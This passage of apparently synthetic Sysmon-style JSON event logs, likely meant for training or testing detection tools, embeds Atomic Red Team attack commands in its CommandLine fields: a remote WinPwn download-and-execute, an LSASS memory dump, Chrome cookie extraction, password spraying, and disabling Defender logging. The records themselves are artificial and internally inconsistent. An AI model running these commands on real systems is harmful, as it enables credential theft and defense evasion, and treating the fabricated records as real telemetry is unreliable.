        "CommandLine": "\"get-acl REGISTRY::HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\* |FL\\nget-acl REGISTRY::HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\#{weak_service_name} |FL\\n\",",
        "LogonID": 208103,
        "LogonGuid": "3d3cf274-85ce-4d7a-8584-36922cd13e40",
        "SourceProcessID": 5452,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\should..exe",
        "DestinationProcessID": 3445,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\receive..dll",
        "UtcTime": "2024-05-17T01:36:51.754822Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-35.bolton.com",
        "User": "hendersonnicholas",
        "ProcessID": 2934,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 905130,
        "LogonGuid": "d4fb4365-9cc3-42a8-871b-b49a1c26b02c",
        "SourceProcessID": 7821,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\I..exe",
        "DestinationProcessID": 4409,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\whole..exe",
        "UtcTime": "2024-05-17T01:36:51.754822Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-25.bruce.org",
        "User": "jasonbecker",
        "ProcessID": 3872,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"pushd #{destination_path}\\necho var fileObject = WScript.createobject(\\\"Scripting.FileSystemObject\\\");var newfile = fileObject.CreateTextFile(\\\"AtomicTestFileT1105.js\\\", true);newfile.WriteLine(\\\"This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.\\\");newfile.Close(); > AtomicTestT1105.js\\nCScript.exe AtomicTestT1105.js //E:JScript\\ndel AtomicTestT1105.js /Q >nul 2>&1\\ndel AtomicTestFileT1105.js /Q >nul 2>&1\\npopd\\n\",",
        "LogonID": 573055,
        "LogonGuid": "45d018d0-ebe3-4e9b-b81f-ddd02b5c3e53",
        "SourceProcessID": 1789,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\government..dll",
        "DestinationProcessID": 8294,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\sort..exe",
        "UtcTime": "2024-05-17T01:36:51.754822Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-10.west.org",
        "User": "browneric",
        "ProcessID": 4247,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\npowerSQL -noninteractive -consoleoutput\",",
        "LogonID": 767072,
        "LogonGuid": "b6d63fc3-2327-4d19-b602-8b8b580170c2",
        "SourceProcessID": 7180,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\important..exe",
        "DestinationProcessID": 9862,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\add..dll",
        "UtcTime": "2024-05-17T01:36:51.754822Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-50.chaney-wright.org",
        "User": "tmcdonald",
        "ProcessID": 9605,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"wmic shadowcopy call create Volume=#{drive_letter}\\n\",",
        "LogonID": 510036,
        "LogonGuid": "80d986ec-d57e-4b47-8c24-6e59f6216b35",
        "SourceProcessID": 2516,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\question..exe",
        "DestinationProcessID": 8958,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\manage..exe",
        "UtcTime": "2024-05-17T01:36:51.755823Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-65.martinez-mccoy.com",
        "User": "bholden",
        "ProcessID": 8274,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"netsh advfirewall firewall add rule name=\\\"atomic testing\\\" action=allow dir=in protocol=TCP localport=450 \\n\",",
        "LogonID": 559725,
        "LogonGuid": "336c872c-9c01-4bd4-9656-903b88317576",
        "SourceProcessID": 7115,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\suggest..dll",
        "DestinationProcessID": 4078,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\tonight..dll",
        "UtcTime": "2024-05-17T01:36:51.755823Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-57.cook-pena.com",
        "User": "iwillis",
        "ProcessID": 2972,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"cd \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\"\\n.\\\\kerbrute.exe userenum -d #{Domain} --dc #{DomainController} \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\username.txt\\\"\",",
        "LogonID": 723845,
        "LogonGuid": "058b1946-8093-47ad-a387-9b0168fc9ade",
        "SourceProcessID": 6442,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\job..dll",
        "DestinationProcessID": 2785,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\partner..exe",
        "UtcTime": "2024-05-17T01:36:51.755823Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-25.gomez.com",
        "User": "tapiakyle",
        "ProcessID": 3712,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"@FOR /F %n in (%temp%\\\\users.txt) do @echo | set/p=. & @net use %logonserver%\\\\IPC$ /user:\\\"%userdomain%\\\\%n\\\" \\\"#{password}\\\" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\\\\IPC$ > NUL\\n\",",
        "LogonID": 643739,
        "LogonGuid": "686a81da-448a-4443-b05f-51c3e96c5ce9",
        "SourceProcessID": 1401,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\particular..exe",
        "DestinationProcessID": 3999,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\finally..dll",
        "UtcTime": "2024-05-17T01:36:51.756827Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-25.smith.com",
        "User": "emercado",
        "ProcessID": 6869,
        "ProcessName": "nc.exe",
        "CommandLine": "\"if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;\\n\",",
        "LogonID": 118286,
        "LogonGuid": "fedc803a-a601-4839-954b-b502888b25cb",
        "SourceProcessID": 8943,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\management..exe",
        "DestinationProcessID": 3879,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\home..exe",
        "UtcTime": "2024-05-17T01:36:51.756827Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-97.davis.info",
        "User": "russell78",
        "ProcessID": 7519,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nGPORemoteAccessPolicy -consoleoutput -noninteractive\",",
        "LogonID": 419255,
        "LogonGuid": "b4018155-f9f2-44a0-871e-937d0b5f569f",
        "SourceProcessID": 1275,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\ever..dll",
        "DestinationProcessID": 8390,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\course..exe",
        "UtcTime": "2024-05-17T01:36:51.756827Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-79.carlson.com",
        "User": "mjimenez",
        "ProcessID": 4270,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-Windows Defender/Operational\\\" /v Enabled /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 560476,
        "LogonGuid": "4e42a4a8-faf5-45d6-91c7-3ca08a4df162",
        "SourceProcessID": 7471,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\discuss..dll",
        "DestinationProcessID": 9901,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\officer..exe",
        "UtcTime": "2024-05-17T01:36:51.756827Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-70.lambert.net",
        "User": "ronniehampton",
        "ProcessID": 5230,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}\\nnetworksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}\\n\",",
        "LogonID": 661313,
        "LogonGuid": "1c274f07-a1a5-4908-851c-95da3d513455",
        "SourceProcessID": 3111,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\compare..exe",
        "DestinationProcessID": 8294,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\between..exe",
        "UtcTime": "2024-05-17T01:36:51.756827Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-32.hartman.com",
        "User": "frank41",
        "ProcessID": 5719,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"PowerShell -version 2 -command '#{v2_command}'\",",
        "LogonID": 982745,
        "LogonGuid": "38b569fe-3773-4e10-a4b3-f2a8816842bb",
        "SourceProcessID": 6934,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\admit..dll",
        "DestinationProcessID": 8691,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\care..dll",
        "UtcTime": "2024-05-17T01:36:51.756827Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-42.lang-smith.com",
        "User": "dennis09",
        "ProcessID": 9315,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"sudo cp #{script_location} #{script_destination}\\nsudo touch /private/var/db/emondClients/#{empty_file}\\n\",",
        "LogonID": 359423,
        "LogonGuid": "c9d321d2-22b8-455f-ac3a-770492a72696",
        "SourceProcessID": 3486,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\fish..exe",
        "DestinationProcessID": 5068,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\market..dll",
        "UtcTime": "2024-05-17T01:36:51.757824Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-62.patton.biz",
        "User": "marygoodman",
        "ProcessID": 1951,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"net use c: #{share_name}\\nnet share test=#{share_name} /REMARK:\\\"test share\\\" /CACHE:No\\n\",",
        "LogonID": 613133,
        "LogonGuid": "27a190ae-140e-4313-84b0-eee089dfec79",
        "SourceProcessID": 5152,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\piece..exe",
        "DestinationProcessID": 2984,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\seek..dll",
        "UtcTime": "2024-05-17T01:36:51.757824Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-50.matthews.com",
        "User": "rachelwebster",
        "ProcessID": 7435,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"xwd -root -out #{output_file}\\nxwud -in #{output_file}\\n\",",
        "LogonID": 841170,
        "LogonGuid": "3853b231-9f07-4a0e-9094-39217108c38b",
        "SourceProcessID": 5302,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\none..exe",
        "DestinationProcessID": 6602,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\of..dll",
        "UtcTime": "2024-05-17T01:36:51.757824Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-45.williams.info",
        "User": "angela64",
        "ProcessID": 8501,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"stop-process -name \\\"chrome\\\" -force -erroraction silentlycontinue\\n\\\"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];\\\" | cmd /c #{sqlite3_path} \\\"#{cookie_db}\\\" | out-file -filepath \\\"#{output_file}\\\"\\n\",",
        "LogonID": 821948,
        "LogonGuid": "6d94f35c-6895-4c2c-a622-6574c19152f5",
        "SourceProcessID": 8444,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\just..dll",
        "DestinationProcessID": 5768,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\right..dll",
        "UtcTime": "2024-05-17T01:36:51.757824Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-49.smith.com",
        "User": "omar62",
        "ProcessID": 3562,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"az login\\n$userprincipalname = \\\"#{userprincipalname}\\\"\\naz ad user delete --id $userprincipalname\",",
        "LogonID": 295604,
        "LogonGuid": "36c961e0-8176-4693-a314-560173e95386",
        "SourceProcessID": 9549,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\series..dll",
        "DestinationProcessID": 6031,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\health..dll",
        "UtcTime": "2024-05-17T01:36:51.757824Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-25.knight-davidson.com",
        "User": "teresa51",
        "ProcessID": 9435,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" -f (objectcategory=organizationalUnit) #{optional_args}\\n\",",
        "LogonID": 468301,
        "LogonGuid": "e094ba09-1a8c-4162-9f93-555c8232fd24",
        "SourceProcessID": 8703,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\major..dll",
        "DestinationProcessID": 2578,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\east..exe",
        "UtcTime": "2024-05-17T01:36:51.758825Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-82.lawrence.com",
        "User": "smithevelyn",
        "ProcessID": 1636,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\\n\",",
        "LogonID": 497594,
        "LogonGuid": "d5d8f66e-61a2-44ae-8f96-7cae6f9b24c4",
        "SourceProcessID": 7303,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\plan..dll",
        "DestinationProcessID": 9722,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\ever..exe",
        "UtcTime": "2024-05-17T01:36:51.758825Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "srv-04.glover-watkins.com",
        "User": "jamie63",
        "ProcessID": 7070,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\\n. \\\"#{test_harness}\\\"\\n\\n$InstallerAssemblyDir = \\\"#{assembly_dir}\\\"\\n$InstallerAssemblyFileName = \\\"#{assembly_filename}\\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\\"/logfile= /logtoconsole=false `\\\"$InstallerAssemblyFullPath`\\\"\\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\\"\\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\\"@\\n}\\n\",",
        "LogonID": 184003,
        "LogonGuid": "78285706-6f3d-48ba-8b44-d09d85a5f4eb",
        "SourceProcessID": 5803,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\success..exe",
        "DestinationProcessID": 8134,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\idea..dll",
        "UtcTime": "2024-05-17T01:36:51.758825Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-70.esparza.com",
        "User": "jamesfreeman",
        "ProcessID": 4448,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"sudo #{program_path} -a -f -t 3\\n\",",
        "LogonID": 557263,
        "LogonGuid": "48873dae-f274-41a5-8c8b-ae92914261f7",
        "SourceProcessID": 3934,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\ground..exe",
        "DestinationProcessID": 1194,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\central..exe",
        "UtcTime": "2024-05-17T01:36:51.758825Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-75.rodgers-smith.net",
        "User": "chloe09",
        "ProcessID": 2944,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$exePath =  resolve-path \\\"$env:ProgramFiles\\\\dotnet\\\\shared\\\\Microsoft.NETCore.App\\\\5*\\\\createdump.exe\\\"\\n& \\\"$exePath\\\" -u -f $env:Temp\\\\dotnet-lsass.dmp (Get-Process lsass).id\\n\",",
        "LogonID": 850667,
        "LogonGuid": "e01b1656-ec51-45cd-a8d3-a2132dcf790e",
        "SourceProcessID": 6151,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\seem..exe",
        "DestinationProcessID": 7091,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\deep..dll",
        "UtcTime": "2024-05-17T01:36:51.758825Z"
    },
